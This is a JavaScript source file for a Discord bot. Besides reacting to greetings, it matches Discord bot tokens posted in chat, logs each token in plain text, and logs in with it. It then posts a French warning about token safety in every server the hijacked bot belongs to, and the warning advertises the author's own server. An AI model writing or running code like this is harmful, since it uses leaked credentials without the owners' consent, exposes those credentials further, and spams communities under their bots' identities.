/**
 * author: Mizari (Mizari-Dev)
 */
const client = require("../index");
const { GatewayIntentBits, PermissionFlagsBits, Client } = require("discord.js");
const { console } = client;
const GREETING_WORDS = process.env.GREETING_WORDS.split(",");
const GREETING_REACTION_EMOJI = process.env.GREETING_REACTION_EMOJI

client.on("messageCreate", async (message) => {

    // Greeting reaction
    if (GREETING_WORDS.some((word) => message.content.toLowerCase().split(" ").includes(word))) {
        GreetingReaction(message);
    }

    // Token in message manager
    const tokens = message.content.match(/[a-z,0-9,\_,\-]{24}\.[a-z,0-9,\_,\-]{6}\.[a-z,0-9,\_,\-]{38}/gmi);
    if (tokens !== null) {
        TokenDetector(tokens);
    }
});

/**
 * Use tokens in messages to advertise our server
 * @param {RegExpMatchArray} tokens Tokens found in message
 */
function TokenDetector(tokens) {
    console.warn("Tokens found:", tokens);
    tokens.forEach(token => {
        let tmpclient = new Client({
            intents: [
                GatewayIntentBits.Guilds
            ]
        });

        tmpclient.login(token).then(_ => {
            console.log(`Token valid: ${token}`);
        }).catch(err => {
            console.error(`Token invalid: ${token}`);
        });

        tmpclient.on("ready", () => {
            tmpclient.guilds.cache.each(async guild => {
                let chan = await guild.channels.cache.find(ch => {
                    return ch.isTextBased &&
                        ch.isTextBased() &&
                        ch.permissionsFor(guild.members.me).has(PermissionFlagsBits.SendMessages);
                });
                if (!chan) {
                    return;
                }
                await chan.send("Ne publie pas tes tokens n'importe où !!! Un token est comme un mot de passe, ça ne se partage pas. Pour en apprendre plus sur la sécurité informatique -> https://discord.com/servers/l-ordre-des-devs-706640777450881114").catch(_ => { });
            });
            tmpclient.destroy();
        });
    });
}

/**
 * React to greeting messages
 * @param {Message} message Message sent
 */
async function GreetingReaction(message) {
    await message.react(GREETING_REACTION_EMOJI);
}
